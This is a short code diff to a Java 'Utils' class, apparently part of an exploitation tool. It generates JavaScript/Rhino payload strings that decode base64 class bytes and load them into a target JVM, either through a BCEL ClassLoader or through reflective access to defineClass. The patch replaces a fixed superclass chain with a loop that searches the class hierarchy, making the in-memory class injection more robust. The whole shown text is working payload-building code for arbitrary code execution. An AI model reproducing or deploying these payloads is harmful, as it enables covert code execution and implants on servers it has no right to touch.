@@ -104,7 +104,7 @@ public class Utils {
         if (USING_RHINO) {
             return "new com.sun.org.apache.bcel.internal.util.ClassLoader().loadClass(\"" + generateBCELFormClassBytes(classBytes) + "\").newInstance();";
         } else {
-            return "var data = \"" + base64Encode(classBytes) + "\";var dataBytes=java.util.Base64.getDecoder().decode(data);var cloader= java.lang.Thread.currentThread().getContextClassLoader();var superLoader=cloader.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();var method=superLoader.getDeclaredMethod(\"defineClass\",dataBytes.getClass(),java.lang.Integer.TYPE,java.lang.Integer.TYPE);method.setAccessible(true);var memClass=method.invoke(cloader,dataBytes,0,dataBytes.length);memClass.newInstance();";
+            return "var data = \"" + base64Encode(classBytes) + "\";var dataBytes=java.util.Base64.getDecoder().decode(data);var cl= java.lang.Thread.currentThread().getContextClassLoader();var clClass = cl.getClass();var defineClassMethod = null;while (clClass != null) {try {defineClassMethod = clClass.getDeclaredMethod(\"defineClass\", dataBytes.getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);defineClassMethod.setAccessible(true);break;} catch (e) {clClass = clClass.getSuperclass();}}if (defineClassMethod != null) {var memClass = defineClassMethod.invoke(cl, dataBytes, 0, dataBytes.length);memClass.newInstance();} else {throw \"Cannot find defineClass method.\";}";
         }
     }
 
